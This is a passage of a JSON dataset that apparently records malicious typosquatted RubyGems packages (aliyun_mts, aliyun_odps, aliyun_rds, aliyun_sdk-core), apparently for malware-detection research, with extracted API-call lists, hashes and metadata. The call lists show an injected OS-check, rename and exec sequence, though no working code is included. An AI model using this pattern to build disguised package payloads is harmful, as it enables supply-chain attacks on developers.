            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_mts/0.0.0/aliyun_mts-0.0.0_extracted/aliyun_mts-0.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require_relative', 'require_relative', 'require_relative', 'attr_accessor', 'params.[]=', 'input.to_json', 'params.[]=', 'params.[]=', 'URI', 'uri.query=', 'URI.encode_www_form', 'Util.signature_params', 'Net::HTTP.get_response', 'JSON.parse', 'res.body', 'params.[]=', 'input.to_json', 'params.[]=', 'config.to_json', 'params.[]=', 'params.[]=', 'URI', 'uri.query=', 'URI.encode_www_form', 'Util.signature_params', 'Net::HTTP.get_response', 'JSON.parse', 'res.body', 'require', 'require', 'require', 'require', 'require', 'params.merge!', 'default_params', 'params.[]=', 'get_signature', 'params.sort.map { |k, v|\\n  [CGI.escape(k.to_s), CGI.escape(v)].join(\"=\")\\n}.join', 'params.sort.map', 'params.sort', '[CGI.escape(k.to_s), CGI.escape(v)].join', 'CGI.escape', 'k.to_s', 'CGI.escape', '\"GET&\" + CGI.escape(\"/\") + \"&\".+', '\"GET&\" + CGI.escape(\"/\").+', '\"GET&\".+', 'CGI.escape', 'CGI.escape', 'Base64.strict_encode64', 'OpenSSL::HMAC.digest', 'Aliyun::MTS.access_key_secret.+', 'Aliyun::MTS.access_key_secret', 'Aliyun::MTS.access_key_id', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'signature_nonce', 'private', '(rand * 1000000000)\\n.to_s', 'rand.*', 'rand']",
            "n_tokens": 407,
            "embedding": "[ 0.00253657 -0.02809137 -0.00085906 ...  0.00565028 -0.02073873\n  0.02915838]",
            "cluster": "0",
            "id": 717,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_mts/0.0.0/aliyun_mts-0.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_mts/0.0.0/aliyun_mts-0.0.0_extracted",
            "name": "aliyun_mts",
            "version": "0.0.0",
            "published_at": "2020-02-16T04:23:42.783Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "c8e70ebda1a44bc17c1bdafc8b312c6d266326534346362b3f33439f23e6ad95"
        },
        {
            "name_version": "aliyun_odps-0.4.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_odps/0.4.2/aliyun_odps-0.4.2_extracted/aliyun_odps-0.4.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_writer', 'Configuration.new', 'block_given?', 'config.project', 'config', 'fail', 'client.projects.get', 'client.projects', 'client', 'alias_method', 'client.projects.list', 'client.projects', 'client', 'alias_method', 'client.projects.update', 'client.projects', 'client', 'private', 'Aliyun::Odps::Client.new', 'require', 'require', 'require', 'require', 'concat_content_string', 'options.[]', 'options.[]', 'signature', 'signature_string.strip', 'private', 'options.fetch', 'get_cononicalized_odps_headers', 'get_cononicalized_resource', 'options.values_at', 'join_values', '[verb, headers.[](\"Content-MD5\").to_s.strip, headers.[](\"Content-Type\").to_s.strip, time, conon_headers].join(\"\\\\n\").+', '[verb, headers.[](\"Content-MD5\").to_s.strip, headers.[](\"Content-Type\").to_s.strip, time, conon_headers].join', 'headers.[](\"Content-MD5\").to_s.strip', 'headers.[](\"Content-MD5\").to_s', 'headers.[]', 'headers.[](\"Content-Type\").to_s.strip', 'headers.[](\"Content-Type\").to_s', 'headers.[]', 'content_string.force_encoding', 'Base64.encode64', 'OpenSSL::HMAC.digest', 'OpenSSL::Digest::SHA1.new', '(headers || {})\\n.select', 'key.to_s.downcase.start_with?', 'key.to_s.downcase', 'key.to_s', 'odps_headers.empty?', 'odps_headers.keys.sort.map { |key,|\\n  \"#{key.downcase}:#{odps_headers.[](key)}\"\\n}.join(\"\\\\n\").+', 'odps_headers.keys.sort.map { |key,|\\n  \"#{key.downcase}:#{odps_headers.[](key)}\"\\n}.join', 'odps_headers.keys.sort.map', 'odps_headers.keys.sort', 'odps_headers.keys', 'key.downcase', 'odps_headers.[]', 'query.nil?', 'query.empty?', 'Utils.stringify_keys!', 'query.keys.sort.map { |k,|\\n  \"#{k}=#{query.[](k)}\"\\n}.join', 'query.keys.sort.map', 'query.keys.sort', 'query.keys', 'query.[]', 'query_str.empty?', 'conon_resource + \"?\".+', 'conon_resource.+', 'require', 'require', 'require', 'extend', 'has_many', 'attr_reader', 'Aliyun::Odps.config', '[\"get\", \"put\", \"post\", \"delete\", \"options\", \"head\"].each', 'define_method', 'http.send', 'http', 'private', 'Http.new', 'config', 'require', 'attr_accessor', 'Addressable::URI.parse(@endpoint).scheme', 'Addressable::URI.parse', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'assign_error_code', 'assign_request_id', 'response.parsed_response', 'result.key?', 'result.[](\"Error\").[]', 'result.[]', 'result.[](\"Error\").[]', 'result.[]', 'result.key?', 'result.[]', 'result.[]', 'response.headers.[]', 'response.headers', 'Utils.wrap(supported_value).join', 'Utils.wrap', 'require', 'require', 'require', 'include', 'protected', 'MultiXml.parse', 'body', 'body', 'parser', 'attr_reader', 'request', 'default_content_type.merge', 'default_content_type', 'options.[]', 'request', 'options.merge', 'default_content_type.merge', 'default_content_type', 'options.[]', 'request', 'options.merge', 'default_content_type.merge', 'default_content_type', 'options.[]', 'request', 'options.merge', 'request', 'request', 'private', 'options.fetch', 'options.fetch', 'options.delete', 'append_headers!', 'options.merge', 'config.endpoint.+', 'config.endpoint', 'config', 'append_options!', 'wrap', 'self.class.__send__', 'self.class', 'verb.downcase', 'response.code', 'fail', 'append_default_headers!', 'append_body_headers!', 'append_authorization_headers!', 'options.merge!', 'config.ssl_ca_file', 'config', 'options.merge!', 'config.ssl_ca_file', 'config', 'url.start_with?', 'options.merge!', 'headers.merge!', 'default_headers', 'headers.key?', 'headers.merge!', 'Utils.md5_hexdigest', 'headers.key?', 'headers.merge!', 'Utils.content_size(body).to_s', 'Utils.content_size', 'get_auth_key', 'options.merge', 'headers.[]', 'headers.merge!', 'Authorization.get_authorization', 'config.access_key', 'config', 'config.secret_key', 'config', 'user_agent', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', 'RbConfig::CONFIG.[]', 'RbConfig::CONFIG.[]', 'require', 'include', 'extend', 'attr_reader', 'def_delegators', 'max_items.to_i', 'keys.first', 'Utils.dig_value', 'Utils.dig_value', 'Utils.wrap(Utils.dig_value(result, *keys)).map', 'Utils.wrap', 'Utils.dig_value', 'new', 'extend', 'property', 'property', 'property', 'property', 'property', 'property', 'alias_method', 'Utils.stringify_keys!', 'project.name', 'project', 'Utils.hash_slice', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Aliyun::Odps::List.build', 'Function.new', 'project.name', 'project', 'client.get(path).parsed_response', 'client.get', 'client', 'Function.new', 'Utils.dig_value', 'alias_method', 'project.name', 'project', 'Function.new', 'client.post', 'client', 'build_create_body', 'function.tap', 'obj.location=', 'resp.headers.[]', 'resp.headers', 'project.name', 'project', 'Function.new', '!client.put(path, { body: build_create_body(function) }).!', 'client.put(path, { body: build_create_body(function) }).!', 'client.put', 'client', 'build_create_body', 'project.name', 'project', '!client.delete(path).!', 'client.delete(path).!', 'client.delete', 'client', 'private', 'function.class_type.nil?', 'function.class_type', 'fail', 'function.resources.empty?', 'function.resources', 'fail', 'Utils.to_xml', 'function.name', 'function.class_type', 'function.resources.map', 'function.resources', 'extend', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'project.name', 'project', 'name', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'project.name', 'project', 'name', 'client.get(path, { query: query }).parsed_response.[]', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'project.name', 'project', 'name', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'project.name', 'project', 'name', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Utils.dig_value', 'Hash.[]', 'Utils.wrap(task_results).map', 'Utils.wrap', 'v.[]', 'Aliyun::Odps::TaskResult.new', 'project.name', 'project', 'name', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Utils.wrap(Utils.dig_value(result, *keys)).map', 'Utils.wrap', 'Utils.dig_value', 'InstanceTask.new', 'project.name', 'project', 'name', 'Utils.to_xml', '!client.put(path, { body: body }).!', 'client.put(path, { body: body }).!', 'client.put', 'client', 'project.name', 'project', 'name', 'client.get(path).parsed_response', 'client.get', 'client', 'Utils.dig_value', 'wait_for_terminated', 'list_tasks.each', 'list_tasks', 'task.status.upcase.!=', 'task.status.upcase', 'task.status', 'fail', 'InstanceTaskNotSuccessError.new', 'task.name', 'task.status', 'task_results.[](task.name).result', 'task_results.[]', 'task_results', 'task.name', 'get_status.!=', 'get_status', 'sleep', 'property', 'property', 'property', 'property', 'lambda', 'hash.map', 'property', 'property', 'property', 'property', 'property', 'name', 'comment', 'property', 'query', 'Utils.stringify_keys!', 'project.name', 'project', 'Utils.hash_slice', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Aliyun::Odps::List.build', 'Instance.new', 'hash.merge', 'project', 'Utils.stringify_keys!', 'project.name', 'project', 'validate_and_build_instance', 'client.post', 'client', 'build_create_body', 'append_location', 'resp.headers.[]', 'resp.headers', 'Instance.new', 'project', 'instance.get_status', 'private', 'instance.priority.nil?', 'instance.priority', 'fail', 'instance.tasks.empty?', 'instance.tasks', 'fail', 'Utils.to_xml', 'build_hash', 'instance.name', 'instance.comment', 'instance.priority', 'instance.tasks.map', 'instance.tasks', 'options.key?', 'options.[]', 'Utils.generate_uuid', 'name.match', 'fail', 'options.key?', 'options.[](\"priority\").<', 'options.[]', 'fail', 'build_instance', 'options.[]', 'options.[]', 'Instance.new', 'project', 'client', 'instance.tap', 'obj.location=', 'obj.location', 'obj.name=', 'obj.location.split(\"/\").last', 'obj.location.split', 'obj.location', 'Utils.stringify_keys!', 'Utils.hash_slice', 'client.get', 'client', 'resp.parsed_response', 'Aliyun::Odps::List.build', 'Project.new', 'hash.merge', 'client', 'client.get(\"/projects/#{name}\").parsed_response', 'client.get', 'client', 'Utils.dig_value', 'Project.new', 'hash.merge', 'client', 'Utils.stringify_keys!', 'Project.new', 'options.[]', 'client', '!client.put(\"/projects/#{name}\", { body: build_update_body(project) }).!', 'client.put(\"/projects/#{name}\", { body: build_update_body(project) }).!', 'client.put', 'client', 'build_update_body', 'private', 'project.comment.nil?', 'project.comment', 'fail', 'Utils.to_xml', 'project.name', 'project.comment', 'extend', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'alias_method', 'name', 'Utils.stringify_keys!', 'project.name', 'project', 'Utils.hash_slice', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Aliyun::Odps::List.build', 'Resource.new', 'project.name', 'project', 'client.get', 'client', 'build_resource', 'alias_method', 'project.name', 'project', 'client.head', 'client', 'build_resource', 'alias_method', 'Utils.stringify_keys!', 'project.name', 'project', 'build_create_base_headers', 'build_create_base_body', 'client.post(path, { headers: headers, body: body }).headers.[]', 'client.post(path, { headers: headers, body: body }).headers', 'client.post', 'client', 'Resource.new', 'options.[]', 'Utils.stringify_keys!', 'project.name', 'project', 'build_create_base_headers', 'build_create_base_body', '!client.put(path, { headers: headers, body: body }).!', 'client.put(path, { headers: headers, body: body }).!', 'client.put', 'client', 'project.name', 'project', '!client.delete(path).!', 'client.delete(path).!', 'client.delete', 'client', 'private', 'options.key?', 'headers.[]=', 'options.[]', 'options.key?', 'headers.[]=', 'options.[]', 'options.key?', 'Utils.to_data', 'options.[]', 'body.empty?', 'options.key?(\"table\").!', 'options.key?', 'fail', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.parsed_response.nil?', 'resp.parsed_response', 'hash.[]=', 'resp.parsed_response', 'Resource.new', 'require', 'require', 'extend', 'has_many', 'property', 'property', 'property', 'property', 'property', 'property', 'lambda', 'value.key?', 'JSON.parse', 'value.[]', 'TableSchema.new', 'property', 'property', 'table_partitions.list', 'table_partitions', 'property', 'property', 'lambda', '[\"bigint\", \"double\", \"boolean\", \"datetime\", \"string\"].include?', 'fail', 'property', 'property', 'property', 'property', 'property', 'Utils.stringify_keys!', 'project.name', 'project', 'master.name', 'master', '{ partitions: true, expectmarker: true }.merge', 'Utils.hash_slice', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Aliyun::Odps::List.build', 'build_table_partition', 'generate_create_sql', 'InstanceTask.new', 'project.instances.create', 'project.instances', 'project', 'instance.wait_for_success', 'generate_drop_sql', 'InstanceTask.new', 'project.instances.create', 'project.instances', 'project', 'instance.wait_for_success', 'private', 'partition.map { |k, v|\\n  \"#{k} = \\'#{v}\\'\"\\n}.join', 'partition.map', 'project.name', 'project', 'master.name', 'master', 'partition.map { |k, v|\\n  \"#{k} = \\'#{v}\\'\"\\n}.join', 'partition.map', 'project.name', 'project', 'master.name', 'master', 'Hash.[]', 'Utils.wrap(hash.[](\"Column\")).map', 'Utils.wrap', 'hash.[]', 'property', 'lambda', 'value.map', 'TableColumn.new', 'property', 'lambda', 'value.map', 'TablePartition.new', 'Utils.stringify_keys!', 'project.name', 'project', 'Utils.hash_slice', 'query.merge!', 'client.get(path, { query: query }).parsed_response', 'client.get', 'client', 'Aliyun::Odps::List.build', 'build_table', 'project.name', 'project', 'client.get', 'client', 'build_table', 'Utils.dig_value(resp.parsed_response, \"Table\").merge', 'Utils.dig_value', 'resp.parsed_response', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'resp.headers.[]', 'resp.headers', 'alias_method', 'Utils.stringify_keys!', 'Table.new', 'project', 'options.key?', 'table.comment=', 'options.[]', 'InstanceTask.new', 'generate_create_sql', 'project.instances.create', 'project.instances', 'project', 'instance.wait_for_success', 'Table.new', 'project', 'InstanceTask.new', 'generate_drop_sql', 'project.instances.create', 'project.instances', 'project', 'instance.wait_for_success', 'private', 'project.name', 'project', 'table.name', 'table.schema', 'table.schema.columns', 'table.schema', 'generate_table_coumns_sql', 'table.schema.columns', 'table.schema', 'table.comment', 'table.comment', 'table.schema', 'table.schema.partitions', 'table.schema', 'generate_table_partitions_sql', 'table.schema.partitions', 'table.schema', '\" (\" + columns.map { |column,|\\n  generate_table_column_sql(column)\\n}.join(\", \").+', '\" (\".+', 'columns.map { |column,|\\n  generate_table_column_sql(column)\\n}.join', 'columns.map', 'generate_table_column_sql', '\" PARTITIONED BY (\" + partitions.map { |column,|\\n  generate_table_column_sql(column)\\n}.join(\", \").+', '\" PARTITIONED BY (\".+', 'partitions.map { |column,|\\n  generate_table_column_sql(column)\\n}.join', 'partitions.map', 'generate_table_column_sql', '\"`#{column.name}` #{column.type}\".+', 'column.name', 'column.type', 'column.comment', 'column.comment', 'project.name', 'project', 'table.name', 'Table.new', 'result.merge', 'project', 'property', 'property', 'property', 'require', 'require', 'models.to_s.singularize', 'models.to_s', '\"Aliyun::Odps::#{mod.camelize}s\".constantize', 'mod.camelize', 'define_method', 'klass.build', 'require', 'require', 'require', 'require', 'require', 'require', 'extend', 'has_many', 'has_many', 'has_many', 'has_many', 'has_many', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'Dir.[](File.join(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_odps/0.4.2/aliyun_odps-0.4.2_extracted/aliyun_odps-0.4.2_sourcecode.rb\"), \"model/*.rb\")).each', 'Dir.[]', 'File.join', 'File.dirname', 'require', 'Dir.[](File.join(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_odps/0.4.2/aliyun_odps-0.4.2_extracted/aliyun_odps-0.4.2_sourcecode.rb\"), \"tunnel/*.rb\")).each', 'Dir.[]', 'File.join', 'File.dirname', 'require', 'master.is_a?', 'master', 'master', 'project.client', 'project', '@master.is_a?', '@master.try', 'attr_reader', 'service_pool.[]', 'service_pool', 'new', 'attributes.each', '\"#{Utils.underscore(key)}=\".to_sym', 'Utils.underscore', 'self.respond_to?', 'send', 'validate_required', '(self.class.required_attrs || [])\\n.each', 'self.class.required_attrs', 'self.class', 'send(attr).nil?', 'send', 'missing_attrs.push', 'missing_attrs.empty?', 'fail', 'missing_attrs.join', 'private', 'attrs.each', 'send', 'Utils.underscore', 'project.client', 'project', 'attr_reader', 'options.[]', '@required_attrs.<<', 'attr.to_s', 'define_reader_method', 'define_writer_method', 'private', 'attr_reader', 'options.key?', 'options.[](:init_with).respond_to?', 'options.[]', 'options.[]', 'build_block_with_type', 'define_writer_method_with_block', 'type.to_s', 'build_integer_block', 'build_datetime_block', 'build_string_block', 'build_default_block', 'options.key?', 'options.[](:within).is_a?', 'options.[]', 'build_block_with_within', 'build_default_block', 'proc', 'options.[](:within).include?', 'options.[]', 'value.to_s', 'fail', 'ValueNotSupportedError.new', 'options.[]', 'proc', 'value.to_i', 'proc', 'DateTime.parse', 'proc', 'define_method', 'instance_eval', 'instance_variable_set', 'block.call', 'require', 'require', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'project.name', 'project', 'table_name', 'build_download_query', 'build_download_headers', 'client.get', 'client', 'protobufed2records', 'resp.parsed_response', 'resp.headers.[]', 'resp.headers', 'private', 'download_id', 'columns.join', 'partition_spec', 'query.[]=', 'partition_spec', 'uncompress_data', 'OdpsProtobuf::Deserializer.new', 'build_schema_with', 'deserializer.deserialize', 'raise', 'RecordNotMatchSchemaError.new', 'SnappyReader.uncompress', 'set_accept_encoding', 'encoding.to_s.downcase', 'encoding.to_s', 'headers.[]=', 'headers.[]=', 'headers.delete', 'fail', 'ValueNotSupportedError.new', 'schema.[](\"columns\").select', 'schema.[]', 'schema', 'columns.include?', 'column.[]', 'client.get(\"/projects/#{project_name}/tunnel\", { query: { service: true, curr_project: project_name } }).parsed_response', 'client.get', 'Aliyun::Odps.config.protocol', 'Aliyun::Odps.config', 'require', 'require', 'load_snappy', 'data.slice!', 'Snappy.inflate', 'require', 'raise', 'require', 'require', 'load_snappy', '[IDENTIFIER_CHUNK + (STREAM_IDENTIFIER.length << 8)].pack', 'IDENTIFIER_CHUNK.+', 'STREAM_IDENTIFIER.length.<<', 'STREAM_IDENTIFIER.length', 'STREAM_IDENTIFIER.force_encoding', '(0..data.length)\\n.step', 'data.length', 'data.[]', 'masked_crc32c', 'Snappy.deflate', 'compressed_chunk.length.<=', 'compressed_chunk.length', '(1 - COMPRESSION_THRESHOLD)\\n.*', '1.-', 'chunk.length', 'chunk.force_encoding', 'out.<<', '[chunk_type + ((chunk.length + 4) << 8), crc].pack', 'chunk_type.+', '(chunk.length + 4)\\n.<<', 'chunk.length.+', 'chunk.length', 'out.<<', 'out.join', 'OdpsProtobuf::CrcCalculator.calculate', 'StringIO.new', '(((crc >> 15) | (crc << 17)) + 2726488792)\\n.&', '((crc >> 15) | (crc << 17))\\n.+', '(crc >> 15)\\n.|', 'crc.>>', 'crc.<<', 'require', 'raise', 'Aliyun::Odps.config.dup', 'Aliyun::Odps.config', 'config.endpoint=', 'TunnelRouter.get_tunnel_endpoint', 'project.client', 'project', 'project.name', 'project', 'Aliyun::Odps.config.tunnel_endpoint', 'Aliyun::Odps.config', 'config.endpoint.nil?', 'config.endpoint', 'fail', 'Aliyun::Odps::Client.new', 'project.name', 'project', 'partition.empty?', 'query.merge!', 'generate_partition_spec', 'client.post', 'client', 'resp.parsed_response', 'result.is_a?', 'JSON.parse', 'build_download_session', 'query.[]', 'project.name', 'project', 'partition.empty?', 'query.merge!', 'generate_partition_spec', 'client.post', 'client', 'resp.parsed_response', 'result.is_a?', 'JSON.parse', 'build_upload_session', 'query.[]', 'private', 'partition.map { |k, v|\\n  \"#{k}=#{v}\"\\n}.join', 'partition.map', 'UploadSession.new', 'result.merge', 'project', 'client', 'DownloadSession.new', 'result.merge', 'project', 'client', 'property', 'property', 'property', 'require', 'require', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'property', 'lambda', 'value.map', 'UploadBlock.new', 'alias_method', 'project.name', 'project', 'table_name', 'upload_id', 'partition_spec', 'query.[]=', 'partition_spec', 'build_upload_headers', 'generate_upload_body', '!client.put(path, { query: query, headers: headers, body: body }).!', 'client.put(path, { query: query, headers: headers, body: body }).!', 'client.put', 'client', 'project.name', 'project', 'table_name', 'upload_id', 'partition_spec', 'query.merge!', 'partition_spec', 'client.get', 'client', 'resp.parsed_response', 'result.is_a?', 'JSON.parse', 'update_attrs', 'reload', 'blocks', 'project.name', 'project', 'table_name', 'upload_id', 'partition_spec', 'query.merge!', 'partition_spec', '!client.post(path, { query: query, headers: headers }).!', 'client.post(path, { query: query, headers: headers }).!', 'client.post', 'client', 'private', 'OdpsProtobuf::Serializer.new', 'serializer.serialize', 'schema', 'compress_data', 'raise', 'RecordNotMatchSchemaError.new', 'schema', 'require', 'Zlib::Deflate.deflate', 'SnappyWriter.compress', 'encoding.to_s.downcase', 'encoding.to_s', 'headers.[]=', 'headers.[]=', 'headers.delete', 'fail', 'ValueNotSupportedError.new', 'set_content_encoding', 'require', 'require', 'require', 'require', 'content.respond_to?', 'content.size', 'content.is_a?', 'content.stat.size', 'content.stat', 'Digest::MD5.hexdigest(body).strip', 'Digest::MD5.hexdigest', 'selected_keys.each', 'hash.key?', 'new_hash.[]=', 'hash.[]', 'file_or_bin.respond_to?', 'IO.binread', 'Gyoku.xml', 'hash.dup', 'keys.each', 'new_hash.is_a?', 'new_hash.key?', 'new_hash.[]', 'str.to_s.dup', 'str.to_s', 'word.gsub!', 'word.gsub!', 'word.gsub!', 'word.tr!', 'word.downcase!', 'object.nil?', 'object.respond_to?', 'object.to_ary', 'hash.keys.each', 'hash.keys', 'hash.[]=', 'key.to_s', 'hash.delete', 'Time.now.strftime', 'Time.now', 'SecureRandom.hex']",
            "n_tokens": 5740,
            "embedding": "[-0.00376034 -0.01467568 -0.01075896 ...  0.00713575 -0.0251748\n  0.01646563]",
            "cluster": "0",
            "id": 52,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_odps/0.4.2/aliyun_odps-0.4.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_odps/0.4.2/aliyun_odps-0.4.2_extracted",
            "name": "aliyun_odps",
            "version": "0.4.2",
            "published_at": "2020-02-16T04:24:33.434Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, minitest, mocha, webmock, timecop, rubocop, snappy, httparty, addressable, activesupport, gyoku, odps_protobuf",
            "SHA-256": "a583b7601160cd3c5a7c3dfd79f1188ae6e6e9db5b930c9ce199c224f411577b"
        },
        {
            "name_version": "aliyun_rds-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_rds/0.0.1/aliyun_rds-0.0.1_extracted/aliyun_rds-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'Aliyun::RDS::Service.new', 'puts', 'service.DescribeDBInstances', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'self.access_key_id=', 'options.[]', 'self.access_key_secret=', 'options.[]', 'self.endpoint_url=', 'options.[]', 'self.options=', 'self.access_key_id', 'puts', 'args.[](0).nil?', 'args.[]', 'raise', 'AliyunAPIException.new', 'call_aliyun_with_parameter', 'args.[]', 'private', 'gen_request_parameters', 'URI', 'endpoint_url', 'uri.query=', 'URI.encode_www_form', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'uri.scheme.==', 'uri.scheme', 'http.verify_mode=', 'puts', 'uri.request_uri', 'Net::HTTP::Get.new', 'uri.request_uri', 'http.request', 'JSON.parse', 'response.body', 'raise', 'AliyunAPIException.new', 'response.code', 'response.body', 'params.merge!', 'params.merge!', 'self.options', 'params.[]=', 'method.to_s', 'params.[]=', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'params.[]=', 'SecureRandom.uuid', 'params.[]=', 'compute_signature', 'puts', 'params.keys', 'params.keys.sort', 'params.keys', 'puts', 'sorted_keys.map { |key,|\\n  \"%s=%s\" % [safe_encode(key.to_s), safe_encode(params.[](key))]\\n}.join', 'sorted_keys.map', '\"%s=%s\".%', 'safe_encode', 'key.to_s', 'safe_encode', 'params.[]', 'canonicalized_query_string.length', 'HTTP_METHOD + SEPARATOR + safe_encode(\"/\") + SEPARATOR.+', 'HTTP_METHOD + SEPARATOR + safe_encode(\"/\").+', 'HTTP_METHOD + SEPARATOR.+', 'HTTP_METHOD.+', 'safe_encode', 'safe_encode', 'puts', 'calculate_signature', 'access_key_secret.+', 'access_key_secret', 'HMAC::SHA1.new', 'hmac.update', 'Base64.encode64(hmac.digest).gsub', 'Base64.encode64', 'hmac.digest', 'puts', 'URI.encode_www_form_component(value).gsub(/\\\\+/, \"%20\").gsub(/\\\\*/, \"%2A\").gsub', 'URI.encode_www_form_component(value).gsub(/\\\\+/, \"%20\").gsub', 'URI.encode_www_form_component(value).gsub', 'URI.encode_www_form_component']",
            "n_tokens": 620,
            "embedding": "[ 0.00320382 -0.01569562 -0.00337886 ... -0.0044335  -0.01493344\n  0.02052573]",
            "cluster": "0",
            "id": 400,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_rds/0.0.1/aliyun_rds-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_rds/0.0.1/aliyun_rds-0.0.1_extracted",
            "name": "aliyun_rds",
            "version": "0.0.1",
            "published_at": "2020-02-16T04:26:53.236Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, ruby-hmac",
            "SHA-256": "b312e6d149a7aed6133bc59ad630f50addd860a9d03c1036a3a1f5fea0293da1"
        },
        {
            "name_version": "aliyun_sdk-core-0.1.5",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_sdk-core/0.1.5/aliyun_sdk-core-0.1.5_extracted/aliyun_sdk-core-0.1.5_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'config', 'OpenStruct.new', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'self.access_key_id=', 'options.[]', 'self.access_key_secret=', 'options.[]', 'service_actions.include?', 'service_actions', 'method.to_sym', 'args.[](0).nil?', 'args.[]', 'args.[]', 'send_request', 'service_actions.include?', 'service_actions', 'method.to_sym', 'request_schema', 'request_host', 'request_schema.==', 'request_schema', 'self.class', 'service_definition.[]', 'service_definition', 'service_definition.[]', 'service_definition', 'Aliyun.config.default_schema', 'Aliyun.config', 'service_definition.[]', 'service_definition', 'Aliyun.config.default_format', 'Aliyun.config', 'service_definition.[]', 'service_definition', 'Aliyun::SignatureMethods.[]', 'service_definition.[]', 'service_definition', 'self.class.load_service_definition', 'self.class', 'name', 'service_action_definitions.keys', 'service_action_definitions', 'self.class.load_service_action_definitions', 'self.class', 'name', 'private', 'URI', 'base_url', 'uri.query=', 'URI.encode_www_form', 'generate_request_params', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'secure?', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'logger.debug', 'logger', 'uri.request_uri', 'http.request', 'process_data', 'response.body', 'raise', 'process_error', 'response.code', 'response.body', 'process_params', 'logger.debug', 'logger', 'params.merge', 'default_params', 'logger.debug', 'logger', 'params.[]=', 'signature_method.generate', 'signature_method', 'logger.debug', 'logger', 'service_action_definitions.[](action).[]', 'service_action_definitions.[]', 'service_action_definitions', 'params.reduce', 'param_definitions.[](k).nil?', 'param_definitions.[]', 'new_params.[]=', 'param_definitions.[](k).[]', 'param_definitions.[]', 'JSON.parse', 'Aliyun::Errors::Base.new', 'response_format', 'api_version', 'service_action_definitions.[](action).[]', 'service_action_definitions.[]', 'service_action_definitions', 'access_key_id', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'signature_method.name', 'signature_method', 'signature_method.version', 'signature_method', 'SecureRandom.uuid', 'Aliyun.config.logger', 'Aliyun.config', 'Logger.new', '@@service_definition.[]', 'Aliyun::Utils.symbolize_hash_keys', 'YAML.load_file', 'api_definition_dir', '@@service_action_definitions.[]', 'Dir.[](\"#{api_definition_dir}/#{service_name}/*.yml\").map { |file,|\\n  File.basename(file, \".yml\")\\n}.reduce', 